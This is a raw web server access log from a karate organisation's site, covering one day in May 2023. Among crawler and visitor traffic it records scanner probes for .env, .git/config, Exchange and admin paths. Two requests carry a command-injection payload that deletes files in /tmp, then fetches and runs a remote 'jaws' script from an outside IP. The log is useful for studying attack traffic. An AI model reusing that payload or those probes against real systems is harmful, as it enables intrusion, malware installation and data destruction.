::ffff:193.35.18.61 - - [11/May/2023:00:16:18 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:39.52.231.249 - - [11/May/2023:07:00:28 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
::ffff:87.236.176.70 - - [11/May/2023:07:01:15 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
::ffff:87.236.176.66 - - [11/May/2023:07:01:16 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
::ffff:135.125.244.48 - - [11/May/2023:07:04:48 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [11/May/2023:07:04:48 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:43.142.179.19 - - [11/May/2023:07:12:01 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
::ffff:185.254.196.173 - - [11/May/2023:07:17:02 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [11/May/2023:07:17:03 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:43.155.118.219 - - [11/May/2023:07:18:50 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:103.187.191.209 - - [11/May/2023:07:33:38 +0000] "GET / HTTP/1.0" 200 58146 "-" "-"
::ffff:103.187.191.157 - - [11/May/2023:07:33:39 +0000] "GET /nmaplowercheck1683790418 HTTP/1.1" 404 163 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
::ffff:103.187.191.157 - - [11/May/2023:07:33:39 +0000] "POST /sdk HTTP/1.1" 404 143 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
::ffff:103.187.191.157 - - [11/May/2023:07:33:39 +0000] "GET / HTTP/1.0" 200 58146 "-" "-"
::ffff:103.187.191.129 - - [11/May/2023:07:33:39 +0000] "GET /evox/about HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
::ffff:103.187.191.157 - - [11/May/2023:07:33:39 +0000] "GET /HNAP1 HTTP/1.1" 404 144 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
::ffff:103.187.191.231 - - [11/May/2023:07:33:40 +0000] "GET / HTTP/1.0" 200 58146 "-" "-"
::ffff:103.187.191.157 - - [11/May/2023:07:33:41 +0000] "GET / HTTP/1.1" 200 58146 "-" "-"
::ffff:170.64.156.160 - - [11/May/2023:07:37:56 +0000] "GET /manager/html HTTP/1.1" 404 151 "-" "-"
::ffff:52.35.20.1 - - [11/May/2023:07:43:08 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [11/May/2023:07:43:08 +0000] "GET / HTTP/1.1" 200 58146 "-" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [11/May/2023:07:43:08 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [11/May/2023:07:43:08 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [11/May/2023:07:43:08 +0000] "GET /schools HTTP/1.1" 200 97308 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [11/May/2023:07:43:08 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [11/May/2023:07:43:08 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [11/May/2023:07:43:08 +0000] "GET /contact?s=1&ss=10 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [11/May/2023:07:43:08 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [11/May/2023:07:43:08 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [11/May/2023:07:43:08 +0000] "GET /contact?s=1&ss=9 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [11/May/2023:07:43:08 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [11/May/2023:07:43:09 +0000] "GET /events HTTP/1.1" 200 5867 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [11/May/2023:07:43:09 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [11/May/2023:07:43:09 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [11/May/2023:07:43:09 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [11/May/2023:07:43:09 +0000] "GET /contact HTTP/1.1" 200 10017 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:172.105.128.13 - - [11/May/2023:07:50:32 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:54.171.6.200 - - [11/May/2023:07:55:17 +0000] "GET / HTTP/1.0" 200 58146 "-" "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)"
::ffff:132.148.121.7 - - [11/May/2023:07:56:47 +0000] "GET / HTTP/1.1" 200 58146 "-" "-"
::ffff:110.80.136.230 - - [11/May/2023:08:02:14 +0000] "GET / HTTP/1.1" 200 58146 "-" "Go-http-client/1.1"
::ffff:34.245.220.61 - - [11/May/2023:08:15:31 +0000] "GET / HTTP/1.0" 200 58146 "-" "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)"
::ffff:17.241.227.171 - - [11/May/2023:08:28:06 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
::ffff:185.254.196.186 - - [11/May/2023:08:36:20 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.186 - - [11/May/2023:08:36:20 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.143.59 - - [11/May/2023:08:39:13 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:43.155.118.219 - - [11/May/2023:08:39:20 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:114.119.136.251 - - [11/May/2023:08:39:45 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:62.8.65.212 - - [11/May/2023:08:43:08 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:162.243.147.28 - - [11/May/2023:08:51:32 +0000] "GET /owa/auth/x.js HTTP/1.1" 404 152 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:198.199.117.207 - - [11/May/2023:09:00:52 +0000] "GET /owa/auth/logon.aspx HTTP/1.1" 404 158 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:162.243.145.13 - - [11/May/2023:09:00:57 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 214 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:152.89.196.144 - - [11/May/2023:09:07:14 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:182.43.148.98 - - [11/May/2023:09:38:27 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
::ffff:45.79.171.66 - - [11/May/2023:09:55:25 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:135.125.244.48 - - [11/May/2023:09:59:05 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [11/May/2023:09:59:05 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:104.152.52.201 - - [11/May/2023:09:59:35 +0000] "GET / HTTP/1.0" 200 58146 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
::ffff:43.155.118.219 - - [11/May/2023:10:01:41 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:54.36.112.44 - - [11/May/2023:10:07:25 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.112.44 - - [11/May/2023:10:07:25 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:45.79.171.66 - - [11/May/2023:10:21:12 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:103.187.191.219 - - [11/May/2023:10:33:30 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:35.80.16.173 - - [11/May/2023:10:48:10 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "python-requests/2.28.2"
::ffff:35.80.16.173 - - [11/May/2023:10:48:10 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "python-requests/2.28.2"
::ffff:35.80.16.173 - - [11/May/2023:10:48:10 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "python-requests/2.28.2"
::ffff:35.80.16.173 - - [11/May/2023:10:48:10 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "python-requests/2.28.2"
::ffff:35.80.16.173 - - [11/May/2023:10:48:10 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "python-requests/2.28.2"
::ffff:35.80.16.173 - - [11/May/2023:10:48:10 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "python-requests/2.28.2"
::ffff:66.249.65.60 - - [11/May/2023:11:00:52 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.56 - - [11/May/2023:11:00:52 +0000] "GET /instructors HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.60 - - [11/May/2023:11:09:35 +0000] "GET /shinkokata HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:157.55.39.207 - - [11/May/2023:11:10:03 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:43.155.118.219 - - [11/May/2023:11:23:14 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:66.249.65.49 - - [11/May/2023:11:32:05 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 304 - "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:45.79.171.66 - - [11/May/2023:11:32:21 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:66.249.65.60 - - [11/May/2023:11:45:35 +0000] "GET /instructors HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:61.68.77.45 - - [11/May/2023:11:48:31 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 200 691794 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
::ffff:61.68.77.45 - - [11/May/2023:11:48:34 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 206 1 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
::ffff:61.68.77.45 - - [11/May/2023:11:48:35 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 206 677706 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
::ffff:135.125.244.48 - - [11/May/2023:11:48:40 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [11/May/2023:11:48:40 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:45.79.171.66 - - [11/May/2023:12:07:05 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:54.171.45.11 - - [11/May/2023:12:14:30 +0000] "HEAD / HTTP/1.1" 200 58146 "-" "webprosbot/2.0 (+mailto:abuse-6337@webpros.com)"
::ffff:167.248.133.125 - - [11/May/2023:12:14:52 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.125 - - [11/May/2023:12:15:03 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.248.133.125 - - [11/May/2023:12:15:03 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.125 - - [11/May/2023:12:15:03 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.34 - - [11/May/2023:12:15:17 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.34 - - [11/May/2023:12:15:28 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.248.133.34 - - [11/May/2023:12:15:28 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.34 - - [11/May/2023:12:15:28 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:66.249.65.47 - - [11/May/2023:12:24:35 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.49 - - [11/May/2023:12:24:35 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.49 - - [11/May/2023:12:24:36 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "https://34.212.47.6/contact" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:170.64.156.160 - - [11/May/2023:12:28:21 +0000] "GET /manager/html HTTP/1.1" 404 151 "-" "-"
::ffff:35.233.62.116 - - [11/May/2023:12:40:46 +0000] "GET / HTTP/1.1" 200 58146 "-" "python-requests/2.28.2"
::ffff:43.155.118.219 - - [11/May/2023:12:43:09 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:135.125.244.48 - - [11/May/2023:12:44:56 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [11/May/2023:12:44:56 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.180.143.77 - - [11/May/2023:12:45:23 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
::ffff:3.121.208.220 - - [11/May/2023:12:55:33 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:60.221.238.187 - - [11/May/2023:13:01:43 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:4.194.248.33 - - [11/May/2023:13:04:55 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:4.194.248.33 - - [11/May/2023:13:04:55 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:157.55.39.207 - - [11/May/2023:13:05:54 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:99.92.93.12 - - [11/May/2023:13:09:03 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15"
::ffff:99.92.93.12 - - [11/May/2023:13:09:06 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15"
::ffff:54.36.112.44 - - [11/May/2023:13:16:48 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.112.44 - - [11/May/2023:13:16:49 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:159.203.192.17 - - [11/May/2023:13:18:10 +0000] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 404 158 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:157.55.39.207 - - [11/May/2023:13:19:17 +0000] "GET /joinemail?type=tournaments HTTP/1.1" 200 8829 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:45.79.171.66 - - [11/May/2023:13:23:03 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:35.90.252.15 - - [11/May/2023:13:27:40 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.222.107.59 - - [11/May/2023:13:27:57 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:52.89.85.61 - - [11/May/2023:13:28:08 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.221.219.121 - - [11/May/2023:13:28:45 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.221.219.121 - - [11/May/2023:13:28:48 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:167.248.133.49 - - [11/May/2023:13:41:45 +0000] "GET / HTTP/1.1" 200 58146 "-" "-"
::ffff:167.248.133.49 - - [11/May/2023:13:41:46 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.49 - - [11/May/2023:13:41:46 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.248.133.49 - - [11/May/2023:13:41:46 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.49 - - [11/May/2023:13:41:46 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:109.237.97.180 - - [11/May/2023:13:42:43 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:159.203.45.131 - - [11/May/2023:13:49:24 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:159.203.45.131 - - [11/May/2023:13:49:24 +0000] "GET /client/get_targets HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:159.203.45.131 - - [11/May/2023:13:49:24 +0000] "GET /upl.php HTTP/1.1" 404 146 "-" "Mozilla/5.0"
::ffff:159.203.45.131 - - [11/May/2023:13:49:25 +0000] "GET /geoip/ HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:159.203.45.131 - - [11/May/2023:13:49:25 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.0.54 (like Safari/604.1)"
